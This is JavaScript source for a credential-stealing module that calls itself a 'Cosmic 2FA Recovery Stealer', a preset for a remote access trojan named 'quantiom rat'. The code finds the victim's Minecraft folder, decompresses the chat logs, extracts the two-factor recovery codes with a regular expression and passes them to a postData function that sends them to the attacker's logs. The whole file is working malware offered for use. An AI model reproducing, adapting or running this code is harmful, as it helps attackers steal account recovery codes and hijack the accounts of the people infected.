/**
 * Cosmic 2FA Recovery Stealer
 * Preset Code for quantiom rat
 *
 * Description: Grabs the client's 2FA recovery codes from their logs and posts it to their data logs.
 * Last Updated: 9/6/2020
 */

const fs = require('fs');
const path = require('path');
const os = require('os');
const zlib = require('zlib');

const getMinecraftFolder = () => {
    switch (os.type()) {
        case 'Darwin':
            return (folder = path.join(os.homedir(), '/Library/Application Support/minecraft'));

        case 'win32':
        case 'Windows_NT':
            return (folder = path.join(process.env.APPDATA, '.minecraft'));

        default:
            return path.join(os.homedir(), '.minecraft');
    }
};

const streamToString = (stream, enc, cb) => {
    if (typeof enc === 'function') {
        cb = enc;
        enc = null;
    }
    cb = cb || function () {};

    let str = '';

    return new Promise(function (resolve, reject) {
        stream.on('data', function (data) {
            str += typeof enc === 'string' ? data.toString(enc) : data.toString();
        });
        stream.on('end', function () {
            resolve(str);
            cb(null, str);
        });
        stream.on('error', function (err) {
            reject(err);
            cb(err);
        });
    });
};

(async () => {
    if (fs.existsSync(getMinecraftFolder()) && fs.existsSync(`${getMinecraftFolder()}\\logs`)) {
        const logsDir = `${getMinecraftFolder()}\\logs`;
        let toPost = {};

        const files = fs.readdirSync(logsDir).filter((f) => f.endsWith('.log.gz'));

        for (let file of files) {
            const unzip = zlib.createGunzip();
            const stream = fs.createReadStream(`${logsDir}/${file}`);

            const data = await streamToString(stream.pipe(unzip));
            let newData = data.replace(/\[\d+:\d+:\d+\] \[.+\]: \[CHAT\]\W/g, '');

            if (newData.includes('Please keep the following recovery codes in a safe place:')) {
                const toSave = newData.match(
                    /(Please keep the following recovery codes in a safe place:\r\n\* (\d+)\r\n\* (\d+)\r\n\* (\d+)\r\n\* (\d+)\r\n\* (\d+))/
                )[1];

                toPost[file.split('.log.gz')[0]] = toSave;
            }
        }

        postData(toPost, 'Cosmic 2FA Recovery Codes');
    } else {
        postData('Minecraft directory or launcher profiles file not found.');
    }
})();
